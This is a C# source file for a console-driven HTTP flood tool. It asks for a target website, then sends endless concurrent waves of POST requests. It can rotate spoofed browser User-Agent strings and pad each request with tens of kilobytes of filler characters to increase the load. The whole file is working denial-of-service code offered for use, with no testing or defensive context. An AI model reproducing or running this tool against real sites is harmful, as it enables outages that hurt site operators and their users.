using System;
using System.Threading.Tasks;
using System.Net;
using System.Net.Http;
using System.Linq;

using System.Drawing;
using Pastel;

namespace VortexLibraries
{
    internal static partial class VortexHttp
    {
        internal static async Task Init()
        {
            TitlePrint.Print();
            Console.WriteLine("\n");

            /* Form begin */
            {
                //----------- Initiate
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.CursorVisible = true;
                Console.WriteLine("     ┌───── Input ─────────────--");

                //----------- Ask for link
                while (true)
                {
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    Console.Write("     │ Insert website link: ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    string response = Console.ReadLine();
                    if (IsValidUrl(response, out url))
                    {
                        break;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.Write("     ├─ bruh ts pmo my sigma icl pls lock in n gimme smth da bonkers url \n");
                    }
                }

                //----------- Ask for TaskCount
                while (true)
                {
                    Console.ForegroundColor = ConsoleColor.Magenta;
                    Console.Write("     │ How many requests per task ? ");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    string response = Console.ReadLine();
                    if (int.TryParse(response, out taskCount) && taskCount > 0)
                    {
                        break;
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.Write("     ├─ bruh ts pmo my sigma icl pls lock in n gimme a num more skibidi fr (i aint askin' 4 ur phone num xDDD LOL)\n");
                    }
                }

                //----------- Ask for User-Agent
                Console.CursorVisible = false;
                Console.ForegroundColor = ConsoleColor.Magenta;
                string question = "     │ Would you like to use random User-Agents ? ";
                Console.Write(question);
                bool choice = true;
                while (true)
                {
                    Console.SetCursorPosition(question.Length, Console.CursorTop);
                    Console.Write("[Yessir]  ".Pastel(choice ? Color.LightGreen : Color.White));
                    Console.Write("[Nty]".Pastel(!choice ? Color.IndianRed : Color.White));

                    ConsoleKey key = Console.ReadKey(true).Key;
                    if (key == ConsoleKey.RightArrow) { choice = false; }
                    else if (key == ConsoleKey.LeftArrow) { choice = true; }
                    else if (key == ConsoleKey.Enter) {
                        useRandomUserAgents = choice;
                        Console.WriteLine();
                        break;
                    }
                }

                //----------- Chinese characters
                Console.CursorVisible = false;
                Console.ForegroundColor = ConsoleColor.Magenta;
                question = "     │ Would you like to stuff requests with a lot of data ? (/!\\ High memory usage) ";
                Console.Write(question);
                choice = true;
                while (true)
                {
                    Console.SetCursorPosition(question.Length, Console.CursorTop);
                    Console.Write("[Yessir]  ".Pastel(choice ? Color.LightGreen : Color.White));
                    Console.Write("[Nty]".Pastel(!choice ? Color.IndianRed : Color.White));

                    ConsoleKey key = Console.ReadKey(true).Key;
                    if (key == ConsoleKey.RightArrow) { choice = false; }
                    else if (key == ConsoleKey.LeftArrow) { choice = true; }
                    else if (key == ConsoleKey.Enter)
                    {
                        stuffedRequests = choice;
                        break;
                    }
                }

                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.WriteLine("\n     └──────────── Thank you ───--\n\n");
                Console.CursorVisible = true;
            }
            /* Form end */

            await Task.Delay(1000);

            Task[] tasks = new Task[taskCount]; // create an array of [taskCount] tasks
            while (true)
            {
                for (int i = 0; i < tasks.Length; i++)
                {
                    tasks[i] = SendHTTP();
                }
                await Task.WhenAll(tasks); // wait for all to finish before doing another wave
            }
        }
    }


    internal static partial class VortexHttp
    {
        private static readonly HttpClient client = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
        private static string url = "";
        private static int count = 0;
        private static int taskCount;
        private static bool useRandomUserAgents = false;
        private static bool stuffedRequests = false;

        private static async Task SendHTTP()
        {
            try
            {
                HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, url);
                request.Headers.Referrer = new Uri(url);
                if (stuffedRequests) { request.Content = new StringContent(string.Concat(Enumerable.Repeat("\U0010FFFD", 10000)), System.Text.Encoding.UTF8, "text/plain");}
                if (useRandomUserAgents) { request.Headers.UserAgent.ParseAdd(GetRandomUserAgent());}

                HttpResponseMessage response = await client.SendAsync(request);
                ++count;

                Console.Write(
                    $"\n[#{count.ToString()} {response.StatusCode.ToString()}]:".Pastel(Color.LimeGreen)
                    + " Message sent".Pastel(Color.MediumSlateBlue)
                    );

            }
            catch (Exception e)
            {
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine($"Exception: {e.Message}");
            }
        }

        internal static bool IsValidUrl(string url, out string _url)
        {
            _url = url;
            return Uri.TryCreate(url, UriKind.Absolute, out Uri uriResult)
                && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);
        }


        private static readonly string[] userAgents = new[]
        {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.128 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) Gecko/20100101 Firefox/124.0",
            "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/123.0.2420.65 Chrome/123.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/122.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 11.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
            "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Vivaldi/6.5.3206.63 Chrome/122.0.6261.128 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
        };
        private static string GetRandomUserAgent() => userAgents[new Random().Next(userAgents.Length)];

    }
}
